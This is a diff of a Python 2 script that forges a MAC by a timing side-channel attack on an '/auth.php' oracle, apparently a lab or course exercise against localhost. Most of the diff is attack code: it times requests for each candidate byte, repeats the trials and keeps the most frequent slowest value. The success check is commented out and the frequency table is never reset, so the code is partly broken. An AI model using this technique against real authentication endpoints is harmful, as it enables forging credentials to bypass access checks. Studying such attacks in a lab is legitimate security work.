@@ -9,9 +9,11 @@ import nanotime
 import httplib
 import argparse
 import binascii
+import operator
 
 ORACLE_HOST = "127.0.0.1"
 QUERY_PATH = "/auth.php?"
+RETRY = 3
 
 # generate ticket according to command line argument
 def generate_ticket():
@@ -46,15 +48,16 @@ def to_hex_string(array):
     Return True if status code is 200, otherwise return False
     Query: ticket=xxx&mac=yyy
 """
-def has_valid_MAC(query):
+def validate_MAC(query):
     conn = httplib.HTTPConnection(ORACLE_HOST)
-    conn.request("HEAD", QUERY_PATH + query)
-    status = conn.getresponse().status;
+    conn.request("GET", QUERY_PATH + query)
+    resp = conn.getresponse()
+    # content = resp.read()
 
-    if status == 200:
-        return True
-    else:
-        return False
+    # if content is not "INVALID MAC":
+    #     return True
+    # else:
+    #     return False
 
 
 def timming_attack():
@@ -63,31 +66,53 @@ def timming_attack():
     print ticket
 
     MAC = ""
-    max_interval = 0
     # initialize array
     MAC_array = bytearray([0] * 32)
+    dict_freq = {}
+        #     0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0,
+        # 8:0, 9:0, 10:0, 11:0, 12:0, 13:0, 14:0, 15:0
+
+    # compute a baseline 
+    MAC = to_hex_string(MAC_array)
+    query = "ticket=" + ticket + "&mac=" + MAC
+    print "mac: " + MAC
+    before = nanotime.now()
+    # call oracle
+    validate_MAC(query)
+    after = nanotime.now()
+    max_interval = int(after - before)
+    print "interval: " + str(max_interval)
 
     for i in range (0, 32):
-        for j in range (0, 16):
-            # from left to right, test the value of one byte
-            MAC_array[i] = j
+        # One time result maybe unreliable, 
+        for k in range (0, RETRY):
+            max_interval = 0
+            candidate = 0
+            for j in range (0, 16):
+                # from left to right, test the value of one byte
+                MAC_array[i] = j
+                print str(i)+",("+str(k+1)+"/"+str(RETRY)+"),"+str(j)
+                MAC = to_hex_string(MAC_array)
+                query = "ticket=" + ticket + "&mac=" + MAC
+                print "mac: " + MAC
+                before = nanotime.now()
+                # call oracle
+                validate_MAC(query)
+                after = nanotime.now()
+                interval = int(after - before)
+                print "interval: " + str(interval)
 
-            before = int(nanotime.now())
-            MAC = to_hex_string(MAC_array)
-            query = "ticket=" + ticket + "&mac=" + MAC
-            print "query: " + query
+                # if interval become larger, we got another byte correct
+                if interval > max_interval:
+                    max_interval = interval
+                    candidate = j
+            # increase the frequency of candidate
+            if not candidate in dict_freq:
+                dict_freq[candidate] = 1
+            else:
+                dict_freq[candidate] += 1
+        MAC_array[i] = max(dict_freq.iteritems(), key=operator.itemgetter(1))[0]
 
-            # call oracle
-            if has_valid_MAC(query):
-                break
-            after = int(nanotime.now())
-            interval = after - before
-            print "interval: " + interval
-
-            # if interval become larger, we got another byte correct
-            if interval > max_interval:
-                max_interval = interval
-                break
 
 
 
